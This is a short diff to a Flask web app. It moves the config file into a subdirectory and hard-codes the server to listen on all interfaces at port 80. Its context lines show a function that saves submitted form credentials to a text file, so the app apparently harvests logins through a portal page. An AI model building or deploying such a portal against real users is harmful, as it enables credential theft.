@@ -13,7 +13,8 @@ app = Flask(
 
 # App configuration
 current_dir = dirname(abspath(__file__))
-config_file = join(current_dir, 'portal.conf')
+config_dir = join(current_dir, 'config')
+config_file = join(config_dir, 'portal.conf')
 locale_file = join(current_dir, 'locale.json')
 credentials = join(current_dir, 'credentials.txt')
 app.config.from_pyfile(config_file)
@@ -57,8 +58,7 @@ def save_credentials(form):
 
 if __name__ == '__main__':
     app.run(
-        host = app.config['HOST'],
-        port = app.config['PORT'],
-        debug = app.config['DEBUG'],
+        host = '0.0.0.0',
+        port = 80,
         threaded = True
     )
